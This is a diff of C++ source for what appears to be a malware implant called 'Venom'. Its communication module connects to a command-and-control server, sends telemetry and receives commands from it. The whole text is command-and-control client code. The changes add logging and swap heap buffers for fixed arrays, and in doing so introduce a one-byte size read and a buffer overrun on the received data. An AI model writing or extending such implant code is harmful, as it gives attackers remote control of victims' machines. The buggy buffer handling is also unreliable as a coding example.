@@ -1,5 +1,7 @@
 #include "CommunicationHandler.h"
 
+#define LOG(str) std::cout << str << std::endl
+
 CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
 {
 	cncInformation.sin_family = AF_INET;
@@ -14,10 +16,10 @@ CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
 	if (connectionSocket == INVALID_SOCKET)
 		goto Error;
 
+	return;
+
 Error:
-	std::cout << "fuck" << std::endl;
-	// Add a kill switch for venom, should be a generic function for all classes in case of a fatal failure
-	//WSACleanup();
+	WSACleanup();
 }
 
 bool CommunicationHandler::Communicator::connectToCnc()
@@ -30,7 +32,6 @@ bool CommunicationHandler::Communicator::connectToCnc()
 		}
 	}
 
-	// Add a kiil.
 	WSACleanup();
 	return STATUS_FAILURE;
 }
@@ -43,32 +44,29 @@ void CommunicationHandler::Communicator::sendTelemetry()
 bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command* recievedCommand)
 {
 	// Get data buffer size.
-	char* size = (char*)malloc(sizeof(int));
-	if (size != NULL)
-	{
-		recv(connectionSocket, size, sizeof(int), 0);
-		recievedCommand->size = atoi(size);
-
-		free(size);
-	}
+	char size[4] = { 0 };	
+	recv(connectionSocket, size, sizeof(int), 0);
+	recievedCommand->size = (int)*size;
 
 	if (recievedCommand->size > 0)
 	{
 		// Get the command type.
-		char* commandType = (char*)malloc(sizeof(int));
+		char commandType[4] = { 0 };
 		if (commandType != NULL)
 		{
 			recv(connectionSocket, commandType, sizeof(int), 0);
-			recievedCommand->commandType = atoi(commandType);
-
-			free(commandType);
+			recievedCommand->commandType = (int)*commandType;
+			LOG("This is commandType:\n");
+			LOG(recievedCommand->commandType);
 		}
 		
 		// Get the actual data.
 		recievedCommand->data = (char*)malloc(recievedCommand->size);
 		if (recievedCommand->data != NULL)
 		{
-			recv(connectionSocket, recievedCommand->data, recievedCommand->size, 0);
+			recv(connectionSocket, recievedCommand->data, recievedCommand->size + 1, 0);
+			LOG("This is DATA:\n");
+			LOG(recievedCommand->data);
 		}
 	}
 
